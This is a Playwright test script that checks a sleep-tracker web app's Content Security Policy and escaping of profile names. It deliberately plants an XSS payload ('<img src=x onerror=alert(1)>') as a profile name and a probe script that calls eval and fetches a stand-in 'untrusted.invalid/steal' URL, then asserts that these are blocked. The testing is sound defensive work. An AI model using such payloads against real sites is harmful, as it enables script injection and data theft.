// Serve the built artifact with its actual Pages header policy. Isolated browser;
// mocked GIS transport only, no Google account or user data is used.
import assert from 'node:assert/strict'
import { createServer } from 'node:http'
import { readFile } from 'node:fs/promises'
import { resolve, extname } from 'node:path'
import { createRequire } from 'node:module'
const require = createRequire(import.meta.url)
const { chromium } = require(process.env.SOLEMI_PLAYWRIGHT_MODULE || 'playwright')
const root = resolve('dist')
const headers = Object.fromEntries((await readFile(resolve(root, '_headers'), 'utf8')).split(/\r?\n/)
  .filter(line => /^  \S/.test(line)).map(line => { const at = line.indexOf(':'); return [line.slice(0, at).trim(), line.slice(at + 1).trim()] }))
const mime = { '.html': 'text/html', '.js': 'application/javascript', '.css': 'text/css', '.png': 'image/png', '.webmanifest': 'application/manifest+json' }
const server = createServer(async (request, response) => {
  try {
    const path = new URL(request.url, 'http://local').pathname.replace(/^\/botond-sleep-tracker\//, '/')
    const file = resolve(root, '.' + (path === '/' ? '/index.html' : path))
    if (!file.startsWith(root + '\\') && !file.startsWith(root + '/')) throw Error('outside fixture')
    response.writeHead(200, { ...headers, 'Content-Type': mime[extname(file)] ?? 'application/octet-stream' })
    response.end(await readFile(file))
  } catch { response.writeHead(404); response.end() }
})
await new Promise(resolve => server.listen(0, '127.0.0.1', resolve))
let browser
try {
  const origin = `http://127.0.0.1:${server.address().port}`
  browser = await chromium.launch({ headless: true, channel: process.env.SOLEMI_BROWSER_CHANNEL || 'msedge' })
  const context = await browser.newContext({ serviceWorkers: 'block' })
  const googleRequests = []
  await context.route('https://accounts.google.com/**', async route => {
    const path = new URL(route.request().url()).pathname; googleRequests.push(path)
    await route.fulfill({ status: 200, contentType: path.endsWith('client') ? 'application/javascript' : path.endsWith('style') ? 'text/css' : 'text/html',
      body: path.endsWith('client') ? 'window.gisFixtureLoaded = true;' : '' })
  })
  await context.addInitScript(() => {
    const at = '2026-10-04T10:00:00Z'
    localStorage.setItem('solemiSleep:v4', JSON.stringify({ version: 4,
      settings: { locale: 'hu', activeChildId: 'a', longSleepReminderEnabled: false },
      children: [{ id: 'a', name: '<img src=x onerror=alert(1)>', birthDate: null, photoRef: null, createdAt: at, updatedAt: at }], sessions: [] }))
    window.policyViolations = []
    document.addEventListener('securitypolicyviolation', event => window.policyViolations.push(event.violatedDirective))
  })
  const page = await context.newPage()
  const response = await page.goto(origin + '/botond-sleep-tracker/')
  assert.equal(response.headers()['x-content-type-options'], 'nosniff')
  await page.getByRole('button', { name: 'Beállítások', exact: true }).click()
  await page.getByText('<img src=x onerror=alert(1)>', { exact: true }).waitFor()
  assert.equal(await page.locator('img[src="x"]').count(), 0, 'Profile names remain text')
  assert.deepEqual(await page.evaluate(() => window.policyViolations), [], 'App loads under enforced CSP')
  console.log('PASS: built app/settings render with CSP; profile markup remains escaped')
  await page.evaluate(async () => {
    await new Promise((resolve, reject) => { const s = document.createElement('script'); s.src = 'https://accounts.google.com/gsi/client'; s.onload = resolve; s.onerror = reject; document.head.append(s) })
    await new Promise((resolve, reject) => { const l = document.createElement('link'); l.rel = 'stylesheet'; l.href = 'https://accounts.google.com/gsi/style'; l.onload = resolve; l.onerror = reject; document.head.append(l) })
    await new Promise(resolve => { const f = document.createElement('iframe'); f.src = 'https://accounts.google.com/gsi/button'; f.onload = resolve; document.body.append(f) })
  })
  assert.ok(await page.evaluate(() => window.gisFixtureLoaded))
  assert.ok(['/gsi/client', '/gsi/style', '/gsi/button'].every(path => googleRequests.includes(path)))
  assert.deepEqual(await page.evaluate(() => window.policyViolations), [])
  console.log('PASS: GIS script/style/frame allowed with local mocked content (not OAuth acceptance)')
  await page.evaluate(() => {
    const script = document.createElement('script'); script.textContent = 'window.inlineExecuted=true'; document.head.append(script)
  })
  // Playwright evaluate bypasses page CSP; use an allowed same-origin script to test eval.
  await page.route('**/probe.js*', route => route.fulfill({ contentType: 'application/javascript', body:
    'try { eval("window.evalExecuted=true") } catch {} fetch("https://untrusted.invalid/steal").catch(()=>{}); window.probeDone=true;' }))
  await page.evaluate(() => { const script = document.createElement('script'); script.src = '/botond-sleep-tracker/probe.js?ready'; document.head.append(script) })
  await page.waitForFunction(() => window.probeDone)
  assert.equal(await page.evaluate(() => Boolean(window.inlineExecuted || window.evalExecuted)), false)
  await page.waitForFunction(() => window.policyViolations.includes('connect-src'))
  console.log('PASS: inline script, eval and unapproved outbound connection blocked')
  await context.close()
} finally {
  await browser?.close()
  await new Promise(resolve => server.close(resolve))
}
